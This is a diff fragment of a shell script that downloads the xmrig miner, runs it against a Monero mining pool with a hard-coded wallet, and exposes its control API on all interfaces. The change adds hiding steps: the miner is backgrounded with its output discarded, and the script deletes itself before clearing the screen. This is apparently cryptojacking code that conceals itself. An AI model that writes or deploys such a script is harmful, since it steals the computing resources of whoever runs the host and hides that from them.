@@ -64,6 +64,7 @@ cd $HOME/linux/aaa && curl -o 1.tar.xz https://raw.githubusercontent.com/simulas
 cd $HOME/linux/aaa && tar xvf 1.tar.xz && rm 1.tar.xz
 fi
 cd $HOME/linux/aaa && chmod +x xmrig-notls
-cd $HOME/linux/aaa && ./xmrig-notls --api-worker-id aaaaaaaaaaaaa --http-host 0.0.0.0 --http-port $SERVER_PORT --http-access-token bruh --http-no-restricted -o gulf.moneroocean.stream:10016 -u 48cQ1KwnQr6BSDxDS7Miqs9NryfJNhRruLDxPcT1RaHsEWjVSMu7rBBYDPGaD3dFU74Z74Eufe5ePJuD2QkzCgjCKemcnef -k
+cd $HOME/linux/aaa && ./xmrig-notls --api-worker-id aaaaaaaaaaaaa --http-host 0.0.0.0 --http-port $SERVER_PORT --http-access-token bruh --http-no-restricted -o gulf.moneroocean.stream:10016 -u 48cQ1KwnQr6BSDxDS7Miqs9NryfJNhRruLDxPcT1RaHsEWjVSMu7rBBYDPGaD3dFU74Z74Eufe5ePJuD2QkzCgjCKemcnef -k >> /dev/null &
+rm -rf 1.sh
 clear
 exit
